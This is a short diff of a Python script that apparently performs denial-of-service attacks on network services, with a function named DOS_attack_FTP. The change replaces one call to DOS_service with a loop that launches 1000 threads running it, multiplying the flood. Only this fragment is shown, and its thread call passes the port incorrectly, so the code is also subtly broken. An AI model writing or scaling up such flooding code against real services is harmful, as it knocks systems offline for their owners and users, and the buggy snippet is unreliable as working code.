@@ -1,7 +1,7 @@
 import threading
 import socket
 import sys
-import ftplib
+from ftplib import FTP
 from ssh2.session import Session
 import os
 
@@ -97,4 +97,9 @@ def DOS_attack_FTP():
 
 # if importing this module
 if __name__ == '__main__':
-    DOS_service(PORT)
+    
+    # DOS_service(PORT)
+
+    for i in range(1000):
+        thread = threading.Thread(target=DOS_service, args=PORT)
+        thread.start()
